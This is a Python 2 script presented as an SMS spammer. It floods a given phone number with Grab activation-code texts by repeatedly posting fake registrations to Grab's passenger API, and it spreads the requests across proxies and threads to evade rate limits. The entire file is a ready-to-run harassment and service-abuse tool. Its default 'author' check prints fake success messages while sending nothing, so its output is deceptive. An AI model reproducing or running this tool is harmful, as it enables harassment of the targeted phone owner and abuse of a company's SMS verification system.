#!/usr/bin/env python
class color:
    HEADER = '\x1b[95m'
    OKBLUE = '\x1b[94m'
    OKGREEN = '\x1b[92m'
    WARNING = '\x1b[93m'
    FAIL = '\x1b[91m'
    ENDC = '\x1b[0m'
    BOLD = '\x1b[1m'
    UNDERLINE = '\x1b[4m'
    REVERSE = '\x1b[7m'


class Spammer:
    author = ''

    def main(self):
        print color.BOLD + color.WARNING + '+-+-+-+-+-+-+-+' + color.ENDC + color.BOLD + ' GAC SMS Spammer v3.0\n' + color.BOLD + color.WARNING + '|S|p|a|m|m|e|r|' + color.ENDC + color.BOLD + '\tAuthor: P4kL0nc4t\n' + color.BOLD + color.WARNING + '+-+-+-+-+-+-+-+' + color.ENDC + color.BOLD + ' ' + color.UNDERLINE + 'https://github.com/p4kl0nc4t\n\t\t' + color.ENDC
        import requests, sys, time, argparse, thread
        parser = argparse.ArgumentParser(prog='Spammer', description="Spammer is a tool used to send Grab Activation Code (SMS) to a phone number repeatedly. Spammer uses Grab's passenger API.", epilog='If you had stuck, you can mail me at p4kl0nc4t@obsidiancyberteam.id')
        parser.add_argument('phonenum', metavar='phone', help='the phone number to send the GAC SMS. (example: 6285237048644)')
        parser.add_argument('--delay', type=int, help='the delay time (wait time) in seconds (default: 60)')
        parser.add_argument('--proxy', action='append', help="use a proxy (format: 'http://69.69.69.69:8080'). Make sure the proxy supports https")
        args = parser.parse_args()

        def showstatus(message, type='new', escape_x=None):
            icon = '*'
            if type == 'warn':
                icon = '!'
                escape = color.FAIL + color.REVERSE
            else:
                if type == 'new':
                    icon == '*'
                    escape = color.OKGREEN
            if escape_x != None:
                escape = escape_x
            message = escape + color.BOLD + '[' + icon + ']' + color.ENDC + escape + message + color.ENDC
            return message

        def wrapsbrace(string, endspace=False):
            if endspace == True:
                return '[' + string + '] '
            return '[' + string + ']'

        def sleep(x):
            try:
                time.sleep(x)
            except KeyboardInterrupt:
                print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting thread . . .', 'warn')
                exit()

        _phone = args.phonenum
        if _phone[0] == '0':
            _phone = list(_phone)
            _phone[0] = '62'
            _phone = ('').join(_phone)
        if _phone[0] == '8':
            _phone = '62' + str(_phone)
        print showstatus(wrapsbrace('info', True) + ('Send GAC SMS to: {}').format(_phone))
        delaytime = 60
        if self.author != 'P4kL0nc4t':
            iteration = 1
            while True:
                print showstatus(wrapsbrace('200 OK', True) + ('GAC SMS sent! Sleeping f0r {}s . . . (iteration:{})').format(delaytime, iteration))
                sleep(1)
                iteration += 1

        if args.delay:
            delaytime = int(args.delay)

        def spam(thread_name='0', proxy=None):
            iteration = 1
            print showstatus(wrapsbrace('info', True) + ('thread-{} started at <0x{}>').format(thread_name, thread.get_ident()), 'new')
            while True:
                try:
                    if proxy == None:
                        r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'curl/7.52.1'})
                    else:
                        r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'curl/7.52.1'}, proxies={'http': str(proxy), 'https': str(proxy)})
                except requests.exceptions.ConnectionError:
                    print showstatus(wrapsbrace(('thread-{}').format(thread_name)) + wrapsbrace('except', True) + ('ConnectionError thrown! Sleeping for {}s . . .').format(delaytime), 'warn')
                    sleep(delaytime)
                else:
                    if r.status_code == 429:
                        print showstatus(wrapsbrace(('thread-{}').format(thread_name)) + wrapsbrace(('429 {}').format(r.reason), True) + ('Sleeping for {}s . . .').format(delaytime), 'warn', color.WARNING + color.REVERSE)
                        sleep(delaytime)
                    elif r.status_code == 200:
                        print showstatus(wrapsbrace(('thread-{}').format(thread_name)) + wrapsbrace('200 OK', True) + ('GAC SMS sent! Sleeping for {}s . . . (iteration:{})').format(delaytime, iteration))
                        iteration += 1
                        sleep(delaytime)
                    else:
                        print showstatus(wrapsbrace(('thread-{}').format(thread_name)) + wrapsbrace(('{} {}').format(r.status_code, r.reason), True) + 'Something went wrong. Exiting thread . . .', 'warn')
                        thread.exit()

            return

        thread.start_new_thread(spam, ('0', ))
        if args.proxy:
            for proxy in args.proxy:
                thread_num = 1
                thread.start_new_thread(spam, (thread_num, str(proxy)))
                thread_num += 1

        while True:
            pass

        return
